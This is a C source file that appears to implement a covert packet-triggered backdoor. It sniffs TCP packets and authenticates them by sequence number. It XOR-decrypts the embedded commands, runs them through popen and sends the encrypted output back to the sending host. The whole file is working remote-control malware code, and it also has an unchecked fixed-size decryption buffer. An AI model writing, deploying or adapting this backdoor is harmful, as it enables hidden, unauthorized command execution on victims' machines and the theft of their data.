#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "constants.h"
#include "crypto.h"
#include "networking.h"
#include "packet_auth.h"
#include "packet_handler.h"

/*
 * Executes a command using popen and puts the results into result.
 *
 * NOTE: output must be freed
 *
 * Params:
 *      const char *command: The command to execute.
 *
 *      char **result: The pointer the the output buffer pointer.
 */
char **execute_command(const char *command, int *size)
{
    FILE *fp;
    const int MAX_LINE_LEN = 1024;
    char line_buffer[MAX_LINE_LEN];
    char **temp = NULL;
    char **result = NULL;

    fp = popen(command, "r");

    // grab all the lines and realloc and concat string as needed
    int i = 1;
    while (fgets(line_buffer, MAX_LINE_LEN, fp))
    {
        temp = realloc(result, i * sizeof(char *));
        if (!temp)
        {
            perror("realloc");
            return NULL;
        }
        result = temp;
        result[i - 1] = malloc(strlen(line_buffer) + 1);
        strcpy(result[i - 1], line_buffer);
        i++;
    }
    *size = i - 1;
    pclose(fp);
    return result;
}

/*
 * Callback function for examining captured packets.
 *
 * Params:
 *       u_char* args: Pointer to user data.
 *
 *       const struct pcap_pkthdr* header: Struct that contains information
 * about the captured packet.
 *
 *       u_char* packet: Pointer to the captured packet in serialized form.
 */
void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet)
{
    char command[MAX_COMMAND_LEN];
    char decrypted[MAX_COMMAND_LEN];

    char **command_output_ptr;
    char *command_output;
    char *encrypted_command_output;

    int command_output_size;
    int tcp_sport;
    unsigned int tcp_seqnum;

    char *payload;
    char *end_ptr;

    const struct sniff_ip *ip;
    const struct sniff_tcp *tcp;

    int size_ip = 0;
    int size_tcp = 0;
    int size_payload = 0;

    // clear buffers
    memset(command, 0, MAX_COMMAND_LEN);
    memset(decrypted, 0, MAX_COMMAND_LEN);

    // calculate lengths
    ip = (struct sniff_ip *)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    tcp = (struct sniff_tcp *)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    tcp_sport = ntohs(tcp->th_sport);
    tcp_seqnum = ntohl(tcp->th_seq);

    // Step 1: Locate the payload of the packet
    payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
    size_payload = ntohs(ip->ip_len) - size_ip - size_tcp;

    // Step 2: Authenticate the packet
    if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
        return;
    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n",
           tcp_sport, tcp_seqnum);

    // Step 3: Decrypt the payload
    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload, decrypted,
              size_payload);
    printf("Decrypted payload: %s\n", decrypted);

    // Step 4: Verify decrypted payload has a command in it
    if (!(payload = strstr(decrypted, COMMAND_START)))
    {
        printf("Could not find command start\n");
        return;
    }
    payload += strlen(COMMAND_START);
    if (!(end_ptr = strstr(decrypted, COMMAND_END)))
    {
        printf("Could not find command start\n");
        return;
    }

    // Step 5: Extract the command
    strncpy(command, payload, end_ptr - payload);

    // Step 6: Execute the command
    command_output_ptr = execute_command(command, &command_output_size);
    printf("Command executed:\n%s\n", command);

    int total_size = 0;
    int offset = 0;
    for (int i = 0; i < command_output_size; i++)
    {
        total_size += (strlen(command_output_ptr[i]) + 1);
    }

    // Allocate a string to hold all the strings in the list
    command_output = malloc(total_size);
    for (int i = 0; i < command_output_size; i++)
    {
        offset += sprintf(command_output + offset, "%s", command_output_ptr[i]);
    }
    printf("Command output: \n%s\n", command_output);

    // Step 7: Send the results back
    encrypted_command_output = malloc(total_size);
    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output,
              encrypted_command_output, total_size);
    send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output,
                       total_size);

    free(encrypted_command_output);
    // free command_output which was malloced by
    free(command_output);

    return;
}
